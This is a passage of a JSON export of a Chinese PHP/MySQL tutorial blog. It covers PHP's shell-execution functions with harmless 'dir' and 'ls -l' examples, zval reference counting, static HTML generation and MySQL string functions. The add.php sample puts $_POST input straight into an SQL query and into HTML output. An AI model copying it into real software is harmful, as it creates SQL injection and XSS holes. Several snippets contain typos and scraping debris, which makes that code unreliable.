World&quot;);?&gt;","categories":[{"name":"php","slug":"php","permalink":"http://ningmo.github.io/categories/php/"}],"tags":[]},{"title":"PHP执行外部命令","slug":"php/PHP执行外部命令","date":"2013-07-25T02:48:10.000Z","updated":"2019-08-26T06:09:54.323Z","comments":true,"path":"2013/07/25/php/PHP执行外部命令/","link":"","permalink":"http://ningmo.github.io/2013/07/25/php/PHP执行外部命令/","excerpt":"","text":"PHP是完全支持外部命令的，但是出于安全考虑，一般很少使用。 PHP提供共了3种方法调用外部命令： （1）调用执行外部命令函数（system()，exec()，passthru()，shell_exec()） （2）使用反撇号`执行命令 （3）popen()函数打开进程 下面来一一说明： 一、调用执行外部命令函数 1.exec()函数 1string exec ( string $command [, array &amp;$output [, int &amp;$return_var ］ ) 说明：这个函数不会直接输出结果，而是把结果输出到第二个参数（数组）中，第三个参数用来取得命令执行的状态码，通常执行成功都是返回0。 12345&lt;?php //打印出当前文件目录及其文件信息 exec(&quot;dir&quot;,$out); print_r($out);?&gt; 2.system()函数 string system ( string $command [, int &amp;$return_var ] ) 说明： system在执行系统外部命令时，它执行给定的命令，输出和返回结果。第二个参数是可选的，用来得到命令执行后的状态码。 123&lt;?php system(&quot;dir&quot;);?&gt; 3.passthru()函数 void passthru ( string $command [, int &amp;$return_var ] ) 说明：passthru直接将结果输出到游览器，不返回任何值，且其可以输出二进制，比如图像数据。第二个参数可选，是状态码。 123&lt;?php passthru (&apos;echo $PATH&apos;); ?&gt; 4.shell_exec()函数 string shell_exec ( string $cmd ) 12345&lt;?php/** by www.phpddt.com */$output = shell_exec(&apos;ls -l&apos;);var_dump($output);?&gt; 二、使用反撇号`执行命令 123&lt;?php echo `dir`;?&gt; 说明: 在使用这种方法执行系统外部命令时，要确保shell_exec函数可用，否则是无法使用这种反撇号执行系统外部命令的。 三、使用popen()打开进程，执行命令 1resource popen ( string $command , string $mode ) 说明：可以进行命令交互，popen( )函数打开一个进程管道来执行给定的命令，返回一个文件句柄，可以对它读和写。返回值和fopen()函数一样，返回一个文件指针。除非使用的是单一的模式打开(读or写)，否则必须使用pclose()函数关闭。该指针可以被fgets(),fgetss(),fwrite()调用。出错时，返回FALSE。 可以借鉴手册上这个例子： 12345678&lt;?phperror_reporting(E_ALL);$handle = popen(&apos;/path/to/executable 2&gt;&amp;1&apos;, &apos;r&apos;);echo &quot;&apos;$handle&apos;; &quot; . gettype($handle) . &quot;\\n&quot;;$read = fread($handle, 2096);echo $read;pclose($handle);?&gt; 在PHP中你这样做，可能会带来安全隐患的（详解PHP漏洞），当你使用这些函数来执行系统命令时，可以使用escapeshellcmd()和escapeshellarg()函数阻止用户恶意在系统上执行命令，escapeshellcmd()针对的是执行的系统命令，而escapeshellarg()针对的是执行系统命令的参数。这两个参数有点类似addslashes()的功能。 From:http://www.phpddt.com/php/php-execute-an-external-program.html","categories":[],"tags":[]},{"title":"引用计数基本知识","slug":"php/引用计数基本知识","date":"2013-07-24T09:27:26.000Z","updated":"2019-08-26T06:09:54.330Z","comments":true,"path":"2013/07/24/php/引用计数基本知识/","link":"","permalink":"http://ningmo.github.io/2013/07/24/php/引用计数基本知识/","excerpt":"","text":"引用计数基本知识 每个php变量存在一个叫\"zval\"的变量容器中。一个zval变量容器，除了包含变量的类型和值，还包括两个字节的额外信息。第一个是\"is_ref\"，是个bool值，用来标识这个变量是否是属于引用集合(reference set)。通过这个字节，php引擎才能把普通变量和引用变量区分开来，由于php允许用户通过使用&amp;来使用自定义引用，zval变量容器中还有一个内部引用计数机制，来优化内存使用。第二个额外字节是\"refcount\"，用以表示指向这个zval变量容器的变量(也称符号即symbol)个数。所有的符号存在一个符号表中，其中每个符号都有作用域(scope)，那些主脚本(比如：通过浏览器请求的的脚本)和每个函数或者方法也都有作用域。 当一个变量被赋常量值时，就会生成一个zval变量容器，如下例这样： Example #1 Creating a new zval container &lt;?php $a = \"new string\"; ?&gt; &nbsp; 在上例中，新的变量a，是在当前作用域中生成的。并且生成了类型为 string 和值为new string的变量容器。在额外的两个字节信息中，”is_ref”被默认设置为 FALSE，因为没有任何自定义的引用生成。”refcount” 被设定为 1，因为这里只有一个变量使用这个变量容器. 注意到当”refcount”的值是1时，”is_ref”的值总是FALSE. 如果你已经安装了» Xdebug，你能通过调用函数 xdebug_debug_zval()显示”refcount”和”is_ref”的值。 &nbsp; Example #2 Displaying zval information &lt;?php xdebug_debug_zval('a'); ?&gt; 以上例程会输出： (refcount1234567891011121314151617181920212223242526&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&amp;nbsp;把一个变量赋值给另一变量将增加引用次数(refcount).&amp;nbsp;&lt;div id=&quot;example-364&quot;&gt;&lt;strong&gt;Example #3 Increasing refcount of a zval&lt;/strong&gt;&lt;div&gt;&lt;div&gt;&lt;code&gt;&amp;lt;?php$a = &quot;new string&quot;;$b = $a;xdebug_debug_zval( &apos;a&apos; );?&amp;gt;&lt;/code&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;以上例程会输出：&lt;/div&gt;&lt;div&gt;&lt;div&gt;```a: (refcount=2, is_ref=0)=&apos;new string&apos; &nbsp; 这时，引用次数是2，因为同一个变量容器被变量 a 和变量 b关联.当没必要时，php不会去复制已生成的变量容器。变量容器在”refcount“变成0时就被销毁. 当任何关联到某个变量容器的变量离开它的作用域(比如：函数执行结束)，或者对变量调用了函数 unset()时，”refcount“就会减1，下面的例子就能说明: &nbsp; Example #4 Decreasing zval refcount &lt;?php $a = \"new string\"; $c = $b = $a; xdebug_debug_zval( 'a' ); unset( $b, $c ); xdebug_debug_zval( 'a' ); ?&gt; 以上例程会输出： (refcount1a: (refcount=1, is_ref=0)=&apos;new string&apos; &nbsp; 如果我们现在执行 unset($a);，包含类型和值的这个变量容器就会从内存中删除。 复合类型(Compound Types) 当考虑像 array和object这样的复合类型时，事情就稍微有点复杂. 与 标量(scalar)类型的值不同，array和 object类型的变量把它们的成员或属性存在自己的符号表中。这意味着下面的例子将生成三个zval变量容器。 &nbsp; Example #5 Creating a array zval &lt;?php $a = array( 'meaning' =&gt; 'life', 'number' =&gt; 42 ); xdebug_debug_zval( 'a' ); ?&gt; 以上例程的输出类似于： (refcount123 &apos;meaning&apos; =&amp;gt; (refcount=1, is_ref=0)=&apos;life&apos;, &apos;number&apos; =&amp;gt; (refcount=1, is_ref=0)=42) Or graphically &nbsp; 这三个zval变量容器是: a，meaning和 number。增加和减少”refcount”的规则和上面提到的一样. 下面, 我们在数组中再添加一个元素,并且把它的值设为数组中已存在元素的值: &nbsp; Example #6 Adding already existing element to an array &lt;?php $a = array( 'meaning' =&gt; 'life', 'number' =&gt; 42 ); $a['life'] = $a['meaning']; xdebug_debug_zval( 'a' ); ?&gt; 以上例程的输出类似于： (refcount1234 &apos;meaning&apos; =&amp;gt; (refcount=2, is_ref=0)=&apos;life&apos;, &apos;number&apos; =&amp;gt; (refcount=1, is_ref=0)=42, &apos;life&apos; =&amp;gt; (refcount=2, is_ref=0)=&apos;life&apos;) Or graphically &nbsp; 从以上的xdebug输出信息，我们看到原有的数组元素和新添加的数组元素关联到同一个”refcount”2的zval变量容器. 尽管 Xdebug的输出显示两个值为‘life’的 zval 变量容器，其实是同一个。 函数xdebug_debug_zval()不显示这个信息，但是你能通过显示内存指针信息来看到。 删除数组中的一个元素，就是类似于从作用域中删除一个变量. 删除后,数组中的这个元素所在的容器的“refcount”值减少，同样，当“refcount”为0时，这个变量容器就从内存中被删除，下面又一个例子可以说明： &nbsp; Example #7 Removing an element from an array &lt;?php $a = array( 'meaning' =&gt; 'life', 'number' =&gt; 42 ); $a['life'] = $a['meaning']; unset( $a['meaning'], $a['number'] ); xdebug_debug_zval( 'a' ); ?&gt; 以上例程的输出类似于： (refcount12 &apos;life&apos; =&amp;gt; (refcount=1, is_ref=0)=&apos;life&apos;) &nbsp; 现在，当我们添加一个数组本身作为这个数组的元素时，事情就变得有趣，下个例子将说明这个。例中我们加入了引用操作符，否则php将生成一个复制。 &nbsp; Example #8 Adding the array itself as an element of it self &lt;?php $a = array( 'one' ); $a[] =&amp; $a; xdebug_debug_zval( 'a' ); ?&gt; 以上例程的输出类似于： (refcount123 0 =&amp;gt; (refcount=1, is_ref=0)=&apos;one&apos;, 1 =&amp;gt; (refcount=2, is_ref=1)=...) Or graphically &nbsp; 能看到数组变量 (a) 同时也是这个数组的第二个元素(1) 指向的变量容器中“refcount”为 2。上面的输出结果中的”…”说明发生了递归操作, 显然在这种情况下意味着”…”指向原始数组。 跟刚刚一样，对一个变量调用unset，将删除这个符号，且它指向的变量容器中的引用次数也减1。所以，如果我们在执行完上面的代码后，对变量$a调用unset, 那么变量 $a 和数组元素 “1” 所指向的变量容器的引用次数减1, 从”2”变成”1”. 下例可以说明: &nbsp; Example #9 Unsetting $a 123 0 =&amp;gt; (refcount=1, is_ref=0)=&apos;one&apos;, 1 =&amp;gt; (refcount=1, is_ref=1)=...) Or graphically &nbsp; 清理变量容器的问题(Cleanup Problems) 尽管不再有某个作用域中的任何符号指向这个结构(就是变量容器)，由于数组元素“1”仍然指向数组本身，所以这个容器不能被清除 。因为没有另外的符号指向它，用户没有办法清除这个结构，结果就会导致内存泄漏。庆幸的是，php将在请求结束时清除这个数据结构，但是在php清除之前，将耗费不少空间的内存。如果你要实现分析算法，或者要做其他像一个子元素指向它的父元素这样的事情，这种情况就会经常发生。当然，同样的情况也会发生在对象上，实际上对象更有可能出现这种情况，因为对象总是隐式的被引用。 如果上面的情况发生仅仅一两次倒没什么，但是如果出现几千次，甚至几十万次的内存泄漏，这显然是个大问题。在长时间运行的脚本，比如请求基本上不会结束的守护进程(deamons)或者单元测试中的大的套件(sets)中，在给 eZ 组件库的模板组件做单元测试时，后者(指单元测试中的大的套件)就会出现问题.它将需要耗用2GB的内存，而一般的测试服务器没有这么大的内存空间。 From:http://php.net/manual/zh/features.gc.refcounting-basics.php","categories":[{"name":"php","slug":"php","permalink":"http://ningmo.github.io/categories/php/"}],"tags":[]},{"title":"PHP生成静态html文件 的三种方法","slug":"php/PHP生成静态html文件 的三种方法","date":"2013-07-18T08:37:19.000Z","updated":"2019-08-26T06:09:54.324Z","comments":true,"path":"2013/07/18/php/PHP生成静态html文件 的三种方法/","link":"","permalink":"http://ningmo.github.io/2013/07/18/php/PHP生成静态html文件 的三种方法/","excerpt":"","text":"1,下面使用模版的一个方法! 123456789101112131415 &lt;?php $fp = fopen (&quot;templets.html&quot;,&quot;a&quot;); if ($fp)&#123; $fup = fread ($fp,filesize(&quot;templets.html&quot;)); $fp2 = fopen (&quot;html.shtml&quot;,&quot;w&quot;); if ($fwrite ($fp2,$fup))&#123; $fclose ($fp); $fcolse ($fp2); die (&quot;写入模板成功&quot;); &#125; else &#123; fclose ($fp); die (&quot;写入模板失败!&quot;); &#125; &#125; ?&gt; 简单的将模板写进一个文件中存为html.html2,按时间生成html文件名 &lt;?$content = “这是一个以日期时间为文件名的静态生成网页的测试文件，文件名格式一般为年月日时分秒.html“; 12$date = date(&apos;YmdHis&apos;); $fp = fopen (date(&apos;YmdHis&apos;) . &apos;.html&apos;,&quot;w&quot;); //本函数可用来打开本地或者远端的文件 ‘w’ 开文件方式为写入，文件指针指到开始处，并将原文件的长度设为 0。若文件不存在，则建立新文件。 12345678910111213if (fwrite ($fp,$content))&#123;//格式是.int fwrite(int fp(文件名), string string(内容), int [length](长度));本函数将字符串 string 写入文件资料流的指针 fp 上。若有指定长度 length，则会写入指定长度字符串，或是写到字符串结束。 fclose ($fp);//函数用来关闭已经打开的文件的指针 fp。成功返回 true，失败则返回 false。 die (&quot;写入模板成功&quot;); &#125; else &#123; fclose ($fp); die (&quot;写入模板失败!&quot;); &#125; echo ($content); ?&gt; 3,下面为转换文件名的一个方法 123456789101112131415&lt;?php $s_fname = &quot;93e.php&quot;; $o_fname = &quot;93e.htm&quot;; ob_end_clean(); ob_start(); include($s_fname); $length = ob_get_length(); $buffer = ob_get_contents(); $buffer = eregi_replace(&quot;r&quot;,&quot;&quot;,$buffer); ob_end_clean(); $fp = fopen($o_fname,&quot;w+&quot;); fwrite($fp,$buffer); fclose($fp); ?&gt; 这样就可以把 93e.php转化为静态的HTML文件了 。要注意的是待转换的文件里不能有 ob_end_clean();和 ob_start();语句，且目录要有写权限。 来自：http://www.phpchina.com/archives/view-36910-1.html","categories":[],"tags":[]},{"title":"PHP生成静态html网页的三种方法","slug":"php/PHP生成静态html网页的三种方法","date":"2013-07-18T08:32:30.000Z","updated":"2019-08-26T06:09:54.324Z","comments":true,"path":"2013/07/18/php/PHP生成静态html网页的三种方法/","link":"","permalink":"http://ningmo.github.io/2013/07/18/php/PHP生成静态html网页的三种方法/","excerpt":"","text":"第一种：利用模板。目前PHP的模板可以说是很多了，有功能强大的smarty，还有简单易用的smarttemplate等。它们每一种模板，都有一个获取输出内容的函数。我们生成静态页面的方法，就是利用了这个函数。用这个方法的优点是，代码比较清晰，可读性好。 PHP代码举例： 12345678910&lt;?phprequire(&apos;smarty/Smarty.class.php&apos;);$t = new Smarty;$t-&gt;assign(&quot;title&quot;,&quot;Hello World!&quot;);$content = $t-&gt;fetch(&quot;templates/index.htm&quot;);//这里的 fetch() 就是获取输出内容的函数,现在$content变量里面,就是要显示的内容了$fp = fopen(&quot;archives/2005/05/19/0001.html&quot;, &quot;w&quot;);fwrite($fp, $content);fclose($fp);?&gt; 第二种方法：利用ob系列的函数。这里用到的函数主要是 ob_start(), ob_end_flush(), ob_get_content(),其中ob_start()是打开浏览器缓冲区的意思，打开缓冲后，所有来自PHP程序的非文件头信息均不会发送，而是保存在内部缓冲区，直到你使用了ob_end_flush().而这里最重要的一个函数，就是ob_get_contents(),这个函数的作用是获取缓冲区的内容，相当于上面的那个fetch(),道理一样的。 PHP代码举例： 12345678&lt;?phpob_start();echo &quot;Hello World!&quot;;$content = ob_get_contents();//取得php页面输出的全部内容$fp = fopen(&quot;archives/2005/05/19/0001.html&quot;, &quot;w&quot;);fwrite($fp, $content);fclose($fp);?&gt; 方法三：下面转贴一个比较通用且好懂的 前言： 目前网络上好多网站的新闻发布系统都采用了动态服务器技术生成静态HTML的做法，这样做的好处是：一是能减轻其服务器的负担，二是因为生成了HTML静态页面，所以其网站被搜索引擎搜索到的机率更大一些。笔者的网站曾经使用PHP这一动态技术来构建新闻发布系统，其原理也就是应用了PHP生成HTML静态页面的技术，相关平台是 Windows XP Sp2+php4.32+mysql，因此，在这里，想简单地谈一下这种做法的思路。这篇文章适合于对PHP+MYSQL数据库操作，SQL语句以及网页设计有点基础的朋友，如果您是一个从头开始学的朋友，那么请先打好基础吧！到这里就不用往下看了。如果您都符合上述条件的话，那么恭喜您，请接着往下看。但是，在具体动手构建之前，您还要做好以下几点准备工作。 一、 具备本地调试PHP的功能 在WINDOWS XP操作系统下，笔者建议你可以到网上下载一个PHP+MYSQL+APHCHE的服务器套装，如华军软件园，去那里搜索一下就可以下载到。下载完后默认安装即可，这样您就具备了在本地测试PHP的功能了，省去了很多手动配置的麻烦，怎么样，简单吧，OK，这仅仅只是第一步。 二、 构思新闻发布系统所具备的功能 首页的新闻发布往往是通过后台更新的，后台的更新无非是由添加、编辑、删除数据等基本的功能所实现的。在这里，你可以使用网页设计软件来构建你的想要的后台界面，其功能的实现当然是要用到PHP喽。这一步建议您先想好新闻发布系统要有的功能。在这里，如何用PHP添加、编辑、删除数据就不再重复，因为重点是如何在这基础上生成静态技术。 三、 PHP生成HTML的技术原理。 哈哈。费话说了那么多，终于到了该讲的地方了。其实，这一原理并不复杂，综合地来讲的话，应该是PHP中一个替换数据语法的应用。OK，讲一个简单范例吧，一步一步地分析！相信聪明的你能看得明白的咯，仔细看好每一步即可，在这里，只是引导大家如何做而已，具体的可以实践一下！ （1）在MYSQL里新建一数据库，命名为 database （可自定义），新建一表，命名为 news（因为是新闻发布嘛，取个好记的名字即可，可自定义），然后建立这几个字段名：id (自动递增，这是关键，类型：INT)title (顾名思义，新闻标题，类型可取 TEXT)content (新闻内容，类型可取 TEXT)path (HTML文件路径，类型可取 TEXT) （2）建立 conn.php这是连接数据库的PHP文件，你可以把连接数据的语句单独放在这一文件里，以后多个需要连接数据库的文件直接引用这个文件即可。 （3）设计添加新闻的表格 add.form 简单的源代码如下: 1234567891011&lt;form method=”post” action=”add.php”&gt; //提交至 add.php新闻标题:&lt;input type=”text” name=”title” size=”20”&gt;&lt;br&gt;新闻内容:&lt;textarea name=”content” cols=”10” rows=”25”&gt;&lt;/textarea&gt;&lt;br&gt;&lt;input type=”submit” name=”提交”&gt;&lt;/form&gt;&lt;form method=”post” action=”add.php”&gt; //提交至 add.php新闻标题:&lt;input type=”text” name=”title” size=”20”&gt;&lt;br&gt;新闻内容:&lt;textarea name=”content” cols=”10” rows=”25”&gt;&lt;/textarea&gt;&lt;br&gt;&lt;input type=”submit” name=”提交”&gt;&lt;/form&gt; （4）建立一个 HTML 的模板,另存为model.htm,和 add.php可以在同一目录下。示例源代码: 此新闻的标题:{title} 此新闻的内容:{content} { }大括号内的内容即是要被替换的内容，整个静态模板的设计可以根据自己的思路，但{ }内被替换的内容必须包含在内，如上面的{title}，{content}；咔咔~简单地说，设计好一个很好看的新闻模板后，把要被替换的如{title},{content}等标记放到需要的地方就可以了撒。 （5）详解 add.php 源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phprequire_once(“conn.php”)； //引用conn.php，连接数据库$title=$_POST[“title”];$content=$_POST[“content”]; //获得表单变量//以下建立一文本文档，其值自动计数$countfile=&quot;count.txt&quot;;if(!file_exists($countfile))&#123;fopen($countfile,&quot;w&quot;); //如果此文件不存在，则自动建立一个&#125;$fp=fopen($countfile,&quot;r&quot;);$num=fgets($fp,20);$num=$num+1; //每次其值自动加一fclose($fp);$fp=fopen($countfile,&quot;w&quot;);fwrite($fp,$num); //更新其值fclose($fp);//利用上面自动计数的值获得HTML的路径$path$houzui=”.html”;$path=$num.$houzui;//这样形成的路径是自动增长的，如1.html,2.html,3.html……….添加一条新闻便自动加上1//以下用SQL语句添加数据至表 news$sql=”insert into news (title,content,path) values (‘”.$title.”’,’”.$content.”’,’”.$path.”’)”;$query=mysql_query($sql);//以下为关键之处，把从表单获得的数据替换模板中的&#123;title&#125;,&#123;content&#125;标记$fp=fopen(“model.htm”,”r”) //只读打开模板$str=fread($fp,filesize(“mode.htm”));//读取模板中内容$str=str_replace(“&#123;title&#125;”,$title,$str);$str=str_replace(“&#123;content&#125;”,$content,$str);//替换内容fclose($fp);$handle=fopen($path,”w”); //写入方式打开新闻路径fwrite($handle,$str); //把刚才替换的内容写进生成的HTML文件fclose($handle);//收尾工作:echo “&lt;a href=$path target=_blank&gt;查看刚才添加的新闻&lt;/a&gt;”;OK,整个生成HTML的示例源码就到这里，其关键是用了替换的方法。$str=str_replace(“&#123;被替换的内容&#125;”,$替换的内容,$str); 因此，总结一下以上的做法：先设计好新闻模板，把需要被替换的内容用{ }放到模板中相应的位置，然后设计表单，再是最后的表单处理程序，把从表单中获取的变量替换模板中相应的内容即可，这样每次都会生成不同的HTML；如果需要修改HTML的内容也是一样的，获得修改后的表单内容后，先用 update 语句更新数据库，再重新替换一下模板中的内容即可；删除的话，先delete表中要删除的内容，再用unlink($path) 来删除HTML的物理文件即可。 来自：http://blog.csdn.net/yeqihong/article/details/2122464","categories":[],"tags":[]},{"title":"mysql字符串操作","slug":"mysql/mysql字符串操作","date":"2013-07-05T04:40:12.000Z","updated":"2019-08-26T06:09:54.320Z","comments":true,"path":"2013/07/05/mysql/mysql字符串操作/","link":"","permalink":"http://ningmo.github.io/2013/07/05/mysql/mysql字符串操作/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674ASCII(str)返回字符串str的第一个字符的ASCII值(str是空串时返回0)mysql&gt; select ASCII(’2′);-&gt; 50mysql&gt; select ASCII(2);-&gt; 50mysql&gt; select ASCII(’dete’);-&gt; 100ORD(str)如果字符串str句首是单字节返回与ASCII()函数返回的相同值。如果是一个多字节字符,以格式返回((first byte ASCII code)*256+(second byte ASCII code))[*256+third byte ASCII code...]mysql&gt; select ORD(’2′);-&gt; 50CONV(N,from_base,to_base)对数字N进制转换,并转换为字串返回(任何参数为NULL时返回NULL,进制范围为2-36进制,当to_base是负数时N作为有符号数否则作无符号数,CONV以64位点精度工作)mysql&gt; select CONV(”a”,16,2);-&gt; ‘1010′mysql&gt; select CONV(”6E”,18,8);-&gt; ‘172′mysql&gt; select CONV(-17,10,-18);-&gt; ‘-H’mysql&gt; select CONV(10+”10″+’10′+0xa,10,10);-&gt; ‘40′BIN(N)把N转为二进制值并以字串返回(N是BIGINT数字,等价于CONV(N,10,2))mysql&gt; select BIN(12);-&gt; ‘1100′OCT(N)把N转为八进制值并以字串返回(N是BIGINT数字,等价于CONV(N,10,8))mysql&gt; select OCT(12);-&gt; ‘14′HEX(N)把N转为十六进制并以字串返回(N是BIGINT数字,等价于CONV(N,10,16))mysql&gt; select HEX(255);-&gt; ‘FF’CHAR(N,…)返回由参数N,…对应的ASCII代码字符组成的一个字串(参数是N,…是数字序列,NULL值被跳过) mysql&gt; select CHAR(77,121,83,81,’76′);-&gt; ‘MySQL’mysql&gt; select CHAR(77,77.3,’77.3′);-&gt; ‘MMM’CONCAT(str1,str2,…)把参数连成一个长字符串并返回(任何参数是NULL时返回NULL)mysql&gt; select CONCAT(’My’, ‘S’, ‘QL’);-&gt; ‘MySQL’mysql&gt; select CONCAT(’My’, NULL, ‘QL’);-&gt; NULLmysql&gt; select CONCAT(14.3);-&gt; ‘14.3′LENGTH(str)OCTET_LENGTH(str)CHAR_LENGTH(str)CHARACTER_LENGTH(str)返回字符串str的长度(对于多字节字符CHAR_LENGTH仅计算一次)mysql&gt; select LENGTH(’text’);-&gt; 4mysql&gt; select OCTET_LENGTH(’text’);-&gt; 4LOCATE(substr,str)POSITION(substr IN str)返回字符串substr在字符串str第一次出现的位置(str不包含substr时返回0)mysql&gt; select LOCATE(’bar’, ‘foobarbar’);-&gt; 4mysql&gt; select LOCATE(’xbar’, ‘foobar’);-&gt; 0LOCATE(substr,str,pos)返回字符串substr在字符串str的第pos个位置起第一次出现的位置(str不包含substr时返回0)mysql&gt; select LOCATE(’bar’, ‘foobarbar’,5);-&gt; 7INSTR(str,substr)返回字符串substr在字符串str第一次出现的位置(str不包含substr时返回0)mysql&gt; select INSTR(’foobarbar’, ‘bar’);-&gt; 4mysql&gt; select INSTR(’xbar’, ‘foobar’);-&gt; 0LPAD(str,len,padstr)用字符串padstr填补str左端直到字串长度为len并返回mysql&gt; select LPAD(’hi’,4,’??’);-&gt; ‘??hi’RPAD(str,len,padstr)用字符串padstr填补str右端直到字串长度为len并返回mysql&gt; select RPAD(’hi’,5,’?&apos;);-&gt; ‘hi???’LEFT(str,len)返回字符串str的左端len个字符mysql&gt; select LEFT(’foobarbar’, 5);-&gt; ‘fooba’RIGHT(str,len)返回字符串str的右端len个字符mysql&gt; select RIGHT(’foobarbar’, 4);-&gt; ‘rbar’SUBSTRING(str,pos,len)SUBSTRING(str FROM pos FOR len)MID(str,pos,len)返回字符串str的位置pos起len个字符(使用FROM的丑陋语法是ANSI SQL92标准)mysql&gt; select SUBSTRING(’Quadratically’,5,6);-&gt; ‘ratica’SUBSTRING(str,pos)SUBSTRING(str FROM pos)返回字符串str的位置pos起的一个子串mysql&gt; select SUBSTRING(’Quadratically’,5);-&gt; ‘ratically’mysql&gt; select SUBSTRING(’foobarbar’ FROM 4);-&gt; ‘barbar’SUBSTRING_INDEX(str,delim,count)返回从字符串str的第count个出现的分隔符delim之后的子串(count为正数时返回左端,否则返回右端子串)mysql&gt; select SUBSTRING_INDEX(’www.mysql.com’, ‘.’, 2);-&gt; ‘www.mysql’mysql&gt; select SUBSTRING_INDEX(’www.mysql.com’, ‘.’, -2);-&gt; ‘mysql.com’LTRIM(str)返回删除了左空格的字符串strmysql&gt; select LTRIM(’ barbar’);-&gt; ‘barbar’RTRIM(str)返回删除了右空格的字符串strmysql&gt; select RTRIM(’barbar ‘);-&gt; ‘barbar’TRIM([[BOTH | LEADING | TRAILING] [remstr] FROM] str)返回前缀或后缀remstr被删除了的字符串str(位置参数默认BOTH,remstr默认值为空格)mysql&gt; select TRIM(’ bar ‘);-&gt; ‘bar’mysql&gt; select TRIM(LEADING ‘x’ FROM ‘xxxbarxxx’);-&gt; ‘barxxx’mysql&gt; select TRIM(BOTH ‘x’ FROM ‘xxxbarxxx’);-&gt; ‘bar’mysql&gt; select TRIM(TRAILING ‘xyz’ FROM ‘barxxyz’);-&gt; ‘barx’SOUNDEX(str)返回str的一个同音字符串(听起来“大致相同”字符串有相同的同音字符串,非数字字母字符被忽略,在A-Z外的字母被当作元音)mysql&gt; select SOUNDEX(’Hello’);-&gt; ‘H400′mysql&gt; select SOUNDEX(’Quadratically’);-&gt; ‘Q36324′SPACE(N)返回由N个空格字符组成的一个字符串mysql&gt; select SPACE(6);-&gt; ‘ ‘REPLACE(str,from_str,to_str)用字符串to_str替换字符串str中的子串from_str并返回mysql&gt; select REPLACE(’www.mysql.com’, ‘w’, ‘Ww’);-&gt; ‘WwWwWw.mysql.com’REPEAT(str,count)返回由count个字符串str连成的一个字符串(任何参数为NULL时返回NULL,count&lt;=0时返回一个空字符串)mysql&gt; select REPEAT(’MySQL’, 3);-&gt; ‘MySQLMySQLMySQL’REVERSE(str)颠倒字符串str的字符顺序并返回mysql&gt; select REVERSE(’abc’);-&gt; ‘cba’INSERT(str,pos,len,newstr)把字符串str由位置pos起len个字符长的子串替换为字符串newstr并返回mysql&gt; select INSERT(’Quadratic’, 3, 4, ‘What’);-&gt; ‘QuWhattic’ELT(N,str1,str2,str3,…)返回第N个字符串(N小于1或大于参数个数返回NULL)mysql&gt; select ELT(1, ‘ej’, ‘Heja’, ‘hej’, ‘foo’);-&gt; ‘ej’mysql&gt; select ELT(4, ‘ej’, ‘Heja’, ‘hej’, ‘foo’);-&gt; ‘foo’FIELD(str,str1,str2,str3,…)返回str等于其后的第N个字符串的序号(如果str没找到返回0)mysql&gt; select FIELD(’ej’, ‘Hej’, ‘ej’, ‘Heja’, ‘hej’, ‘foo’);-&gt; 2mysql&gt; select FIELD(’fo’, ‘Hej’, ‘ej’, ‘Heja’, ‘hej’, ‘foo’);-&gt; 0FIND_IN_SET(str,strlist)返回str在字符串集strlist中的序号(任何参数是NULL则返回NULL,如果str没找到返回0,参数1包含”,”时工作异常)mysql&gt; SELECT FIND_IN_SET(’b&apos;,’a,b,c,d’);-&gt; 2MAKE_SET(bits,str1,str2,…)把参数1的数字转为二进制,假如某个位置的二进制位等于1,对应位置的字串选入字串集并返回(NULL串不添加到结果中)mysql&gt; SELECT MAKE_SET(1,’a&apos;,’b&apos;,’c&apos;);-&gt; ‘a’mysql&gt; SELECT MAKE_SET(1 | 4,’hello’,&apos;nice’,&apos;world’);-&gt; ‘hello,world’mysql&gt; SELECT MAKE_SET(0,’a&apos;,’b&apos;,’c&apos;);-&gt; ”EXPORT_SET(bits,on,off,[separator,[number_of_bits]])按bits排列字符串集,只有当位等于1时插入字串on,否则插入off(separator默认值”,”,number_of_bits参数使用时长度不足补0而过长截断)mysql&gt; select EXPORT_SET(5,’Y&apos;,’N&apos;,’,&apos;,4)-&gt; Y,N,Y,NLCASE(str)LOWER(str)返回小写的字符串strmysql&gt; select LCASE(’QUADRATICALLY’);-&gt; ‘quadratically’UCASE(str)UPPER(str)返回大写的字符串strmysql&gt; select UCASE(’quadratically’);-&gt; ‘QUADRATICALLY’LOAD_FILE(file_name)读入文件并且作为一个字符串返回文件内容(文件无法找到,路径不完整,没有权限,长度大于max_allowed_packet会返回NULL)mysql&gt; UPDATE table_name SET blob_column=LOAD_FILE(”/tmp/picture”) WHERE id=1;数学函数ABS(N)返回N的绝对值mysql&gt; select ABS(2);-&gt; 2mysql&gt; select ABS(-32);-&gt; 32SIGN(N)返回参数的符号(为-1、0或1)mysql&gt; select SIGN(-32);-&gt; -1mysql&gt; select SIGN(0);-&gt; 0mysql&gt; select SIGN(234);-&gt; 1MOD(N,M)取模运算,返回N被M除的余数(同%操作符) mysql&gt; select MOD(234, 10);-&gt; 4mysql&gt; select 234 % 10;-&gt; 4mysql&gt; select MOD(29,9);-&gt; 2FLOOR(N)返回不大于N的最大整数值mysql&gt; select FLOOR(1.23);-&gt; 1mysql&gt; select FLOOR(-1.23);-&gt; -2CEILING(N)返回不小于N的最小整数值mysql&gt; select CEILING(1.23);-&gt; 2mysql&gt; select CEILING(-1.23);-&gt; 